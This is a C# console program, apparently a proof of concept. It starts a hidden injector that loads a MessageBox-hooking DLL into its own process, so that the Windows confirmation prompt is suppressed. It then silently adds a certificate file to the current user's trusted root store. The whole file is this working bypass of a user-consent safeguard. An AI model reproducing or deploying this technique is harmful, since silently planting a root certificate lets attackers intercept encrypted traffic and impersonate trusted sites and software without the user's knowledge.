using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Windows.Forms;

namespace cert_test
{
    class Program
    {
        static void Main(string[] args)
        {
            try
            {
                string path = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
                try
                {
                    Console.WriteLine("Initializing hook..");
                    string injector = Path.Combine(path, "Injector.exe");
                    string dll = Path.Combine(path, "MessageBoxHook.dll");
                    int pid = Process.GetCurrentProcess().Id;
                    ProcessStartInfo process = new ProcessStartInfo(injector, pid + " \"" + dll + "\"");
                    process.CreateNoWindow = true;
                    process.WindowStyle = ProcessWindowStyle.Hidden;
                    process.UseShellExecute = true;
                    var proc = Process.Start(process);
                    proc.WaitForExit();
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.Write("Hook created.");
                    Console.ResetColor();
                    Console.WriteLine(" Certificate will be installed silently.");
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.Write("Hook initialization failed.");
                    Console.ResetColor();
                    Console.WriteLine(" Confirmation message box will appear.");
                }

                string file = Path.Combine(path, "test.cer");
                X509Store store = new X509Store(StoreName.Root, StoreLocation.CurrentUser);
                store.Open(OpenFlags.ReadWrite);
                store.Add(new X509Certificate2(X509Certificate2.CreateFromCertFile(file)));
                store.Close();
            }
            catch
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Execution failed due to fatal error.");
                Console.ResetColor();
            }
            Console.WriteLine("Done. Press any key to exit.");
            Console.ReadKey();
        }
    }
}
